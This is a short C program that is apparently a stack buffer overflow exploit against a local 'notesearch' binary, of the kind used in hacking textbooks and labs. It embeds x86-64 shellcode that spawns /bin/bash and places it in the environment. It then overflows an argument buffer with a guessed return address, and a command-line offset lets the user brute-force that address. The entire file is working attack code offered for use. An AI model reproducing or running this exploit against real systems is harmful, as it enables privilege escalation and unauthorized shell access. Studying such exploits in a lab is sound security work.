#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/*
	Porvide an integer argument to bruteforce the destination address
	of shellcode in the stack of the execle created process
*/

char shellcode[]="\xeb\x0b\x5f\x48\x31\xd2\x52\x5e\x6a\x3b\x58\x0f\x05\xe8\xf0"
"\xff\xff\xff\x2f\x2f\x2f\x2f\x62\x69\x6e\x2f\x2f\x2f\x2f\x62\x61\x73\x68";


int main(int argc, char *argv[]) {
	char *env[2] = {shellcode, 0};
	unsigned int decrement, i;
	unsigned long ret;

	char *buffer = (char *) malloc(160);
	for(i=0; i < 120; i+=1)
		*((unsigned int *)(buffer+i)) = 0x41;

	if(argc > 1)
		decrement = atoi(argv[1]);
	else
		decrement = 44;

	ret = 0x7fffffffefff - decrement;

	memcpy(buffer+120, &ret, 6);
	execle("./notesearch", "notesearch", buffer, 0, env);
	free(buffer);
}
